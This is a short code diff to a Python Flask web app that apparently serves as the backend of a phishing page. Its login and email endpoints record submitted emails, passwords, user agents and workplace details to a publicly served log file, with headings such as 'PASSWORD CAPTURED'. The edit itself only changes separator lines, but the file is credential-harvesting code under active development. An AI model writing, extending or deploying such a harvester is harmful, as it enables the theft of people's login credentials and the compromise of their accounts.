@@ -18,10 +18,11 @@ def log_email():
         timestamp = get_local_time().strftime('%Y-%m-%d %H:%M:%S')
         ua = request.headers.get('User-Agent')
         with open("./static/log.txt", "a") as f:
+            f.write("=" * 30 + "\n")
             f.write(f"!!! EMAIL CAPTURED [{timestamp}] !!!\n")
             f.write(f"Email: {email}\n")
             f.write(f"User-Agent: {ua}\n")
-            f.write("- " * 10 + "\n")
+            f.write("=" * 30 + "\n")
         return "Success", 200
     return "Missing Email", 400
 
@@ -51,6 +52,7 @@ def login():
             edificio = request.form.get('edificio')
             planta = request.form.get('planta')
             with open("./static/log.txt", "a") as f:
+                f.write("=" * 30 + "\n")
                 f.write(f"!!! PASSWORD CAPTURED [{timestamp}] !!!\n")
                 f.write(f"Email: {username}\n")
                 f.write(f"User-Agent: {ua}\n")
